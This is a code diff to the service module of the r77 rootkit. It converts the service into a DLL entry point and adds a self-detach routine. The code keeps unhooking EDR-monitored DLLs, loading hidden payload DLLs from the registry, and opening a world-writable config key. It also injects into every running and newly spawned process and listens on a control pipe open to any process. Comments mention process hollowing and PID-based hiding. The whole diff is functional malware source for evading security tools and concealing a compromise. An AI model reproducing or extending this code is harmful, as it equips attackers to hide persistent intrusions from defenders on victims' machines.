@@ -4,14 +4,46 @@
 #include "r77win.h"
 #include "r77config.h"
 #include "r77process.h"
+#include "r77header.h"
 #include "ProcessListener.h"
 #include "ControlPipeListener.h"
 #include <Psapi.h>
 
-int main()
+BOOL WINAPI DllMain(_In_ HINSTANCE module, _In_ DWORD reason, _In_ LPVOID reserved)
+{
+	if (reason == DLL_PROCESS_ATTACH)
+	{
+		if (!InitializeService())
+		{
+			// If the r77 service could not initialize, it is either already attached, or failed to initialize, detach the DLL.
+			return FALSE;
+		}
+	}
+	else if (reason == DLL_PROCESS_DETACH)
+	{
+		UninitializeService();
+	}
+
+	return TRUE;
+}
+
+BOOL InitializeService()
 {
 	// Unhook DLL's that are monitored by EDR.
 	Unhook();
+
+	// If the service is already running (e.g. Install.exe was run twice), gracefully terminate it, and continue initialization.
+	LPVOID existingServiceDetachAddress;
+	if (GetR77Header(&existingServiceDetachAddress) == R77_SERVICE_SIGNATURE)
+	{
+		// The DetachService() function pointer to the already running r77 service is called.
+		// After this function returns, the previous r77 service is completely unloaded.
+
+		((VOID(*)())existingServiceDetachAddress)();
+	}
+
+	// Write the r77 header.
+	if (!WriteR77Header(R77_SERVICE_SIGNATURE, DetachService)) return FALSE;
 
 	EnabledDebugPrivilege();
 
@@ -19,51 +51,32 @@ int main()
 	HKEY key;
 	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_QUERY_VALUE, &key) != ERROR_SUCCESS ||
 		RegQueryValueExW(key, HIDE_PREFIX L"dll32", NULL, NULL, NULL, &Dll32Size) != ERROR_SUCCESS ||
-		RegQueryValueExW(key, HIDE_PREFIX L"dll64", NULL, NULL, NULL, &Dll64Size) != ERROR_SUCCESS) return 0;
+		RegQueryValueExW(key, HIDE_PREFIX L"dll64", NULL, NULL, NULL, &Dll64Size) != ERROR_SUCCESS) return FALSE;
 
 	Dll32 = NEW_ARRAY(BYTE, Dll32Size);
 	Dll64 = NEW_ARRAY(BYTE, Dll64Size);
 
 	if (RegQueryValueExW(key, HIDE_PREFIX L"dll32", NULL, NULL, Dll32, &Dll32Size) != ERROR_SUCCESS ||
-		RegQueryValueExW(key, HIDE_PREFIX L"dll64", NULL, NULL, Dll64, &Dll64Size) != ERROR_SUCCESS) return 0;
+		RegQueryValueExW(key, HIDE_PREFIX L"dll64", NULL, NULL, Dll64, &Dll64Size) != ERROR_SUCCESS) return FALSE;
 
 	RegCloseKey(key);
 
-	// Terminate the already running r77 service process.
-	TerminateR77Service(GetCurrentProcessId());
-
 	// Create HKEY_LOCAL_MACHINE\SOFTWARE\$77config and set DACL to allow full access by any user.
-	HKEY configKey;
-	if (InstallR77Config(&configKey))
-	{
-		// Write current process ID to the list of hidden PID's.
-		// Since this process is created using process hollowing (dllhost.exe), the name cannot begin with "$77".
-		// Therefore, process hiding by PID must be used.
-		HKEY pidKey;
-		if (RegCreateKeyExW(configKey, L"pid", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &pidKey, NULL) == ERROR_SUCCESS)
-		{
-			// The registry values "svc32" and "svc64" are reserved for the r77 service.
-			DWORD processId = GetCurrentProcessId();
-			RegSetValueExW(pidKey, COALESCE_BITNESS(L"svc32", L"svc64"), 0, REG_DWORD, (LPBYTE)&processId, sizeof(DWORD));
-			RegCloseKey(pidKey);
-		}
-
-		RegCloseKey(configKey);
-	}
+	InstallR77Config();
 
 	// When the NtResumeThread hook is called, the r77 service is notified through a named pipe connection.
 	// This will trigger the following callback and the child process is injected.
 	// After it's injected, NtResumeThread is executed in the parent process.
 	// This way, r77 is injected before the first instruction is run in the child process.
-	ChildProcessListener(ChildProcessCallback);
+	ChildProcessListenerThread = ChildProcessListener(ChildProcessCallback);
 
 	// In addition, check for new processes every 100 ms that might have been missed by child process hooking.
 	// This is particularly the case for child processes of protected processes (such as services.exe), because protected processes cannot be injected.
 	// In the first iteration, the callback is invoked for every currently running process, making this the initial injection into all processes.
-	NewProcessListener(100, NewProcessCallback);
+	NewProcessListenerThread = NewProcessListener(NewProcessCallback);
 
 	// Open a named pipe to receive commands from any process.
-	ControlPipeListener(ControlCallback);
+	ControlPipeListenerThread = ControlPipeListener(ControlCallback);
 
 	// There are no implications when injecting a process twice.
 	// If the R77_SIGNATURE is already present in the target process, the newly injected DLL will just unload itself.
@@ -78,9 +91,40 @@ int main()
 
 	DeleteR77Config(config);
 
-	Sleep(INFINITE);
-	return 0;
+	return TRUE;
 }
+VOID UninitializeService()
+{
+	if (ChildProcessListenerThread)
+	{
+		TerminateThread(ChildProcessListenerThread, 0);
+		ChildProcessListenerThread = NULL;
+	}
+
+	if (NewProcessListenerThread)
+	{
+		TerminateThread(NewProcessListenerThread, 0);
+		NewProcessListenerThread = NULL;
+	}
+
+	RemoveR77Header();
+
+	if (ControlPipeListenerThread)
+	{
+		// Terminating the control pipe thread must be the last action!
+		// If this funcion was called from ControlCallback, the current thread will terminate,
+		// thus, this function will cease to execute.
+
+		TerminateThread(ControlPipeListenerThread, 0);
+		ControlPipeListenerThread = NULL;
+	}
+}
+static VOID DetachService()
+{
+	// A thread was created with a pointer to DetachService(), thus requesting the r77 service to remove itself gracefully.
+	UninitializeService();
+}
+
 VOID ChildProcessCallback(DWORD processId)
 {
 	// Hook the newly created child processes before it is actually started.
@@ -110,7 +154,7 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 	{
 		case CONTROL_R77_TERMINATE_SERVICE:
 		{
-			ExitProcess(0);
+			UninitializeService();
 			break;
 		}
 		case CONTROL_R77_UNINSTALL:
@@ -127,7 +171,7 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 			DeleteScheduledTask(R77_SERVICE_NAME64);
 			DetachAllInjectedProcesses();
 			UninstallR77Config();
-			TerminateR77Service(-1);
+			UninitializeService();
 			break;
 		}
 		case CONTROL_R77_PAUSE_INJECTION:
